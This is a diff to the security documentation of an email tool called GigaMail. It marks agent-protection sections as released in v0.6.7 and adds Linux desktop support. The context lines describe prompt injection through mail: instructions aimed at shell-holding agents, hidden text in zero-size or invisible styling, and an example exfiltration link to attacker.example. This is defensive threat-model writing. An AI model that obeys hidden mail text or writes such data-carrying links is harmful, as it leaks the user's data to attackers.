@@ -310,7 +310,7 @@ and neither survives in a deleted database.
 
 ## Executable attachments, and agents that hold a shell
 
-*Unreleased: on `main`, not in a release yet.*
+*Since v0.6.7.*
 
 GigaMail is also used as an MCP server from harnesses (Hermes, OpenClaw,
 Claude Code, Codex) whose agent can run commands. A mail that says
@@ -362,7 +362,7 @@ What this does not stop, stated plainly:
 
 ## Links that fetch themselves
 
-*Unreleased: on `main`, not in a release yet.*
+*Since v0.6.7.*
 
 An assistant can be talked into writing a link that carries data
 (`https://attacker.example/?d=...`), and some places open such a link with
@@ -382,7 +382,7 @@ approval preview is where to look at it.
 
 ## Hidden text: the agent reads what the person sees
 
-*Unreleased: on `main`, not in a release yet.*
+*Since v0.6.7.*
 
 A mail can address the agent in text the person never sees: a block with
 `display:none`, a font of size zero, white text on white, a paragraph
@@ -448,8 +448,9 @@ What this does not stop, stated plainly:
 
 ## The desktop console
 
-The desktop app (Windows since 0.3, macOS since 0.5.1) renders mail written
-by strangers, so its renderer is treated as hostile ground:
+The desktop app (Windows since 0.3, macOS since 0.5.1, Linux since 0.6.7)
+renders mail written by strangers, so its renderer is treated as hostile
+ground:
 
 - **One rendering pipeline.** Every message body — main window, detached
   mail window, forward/quote — passes through the same sanitizer
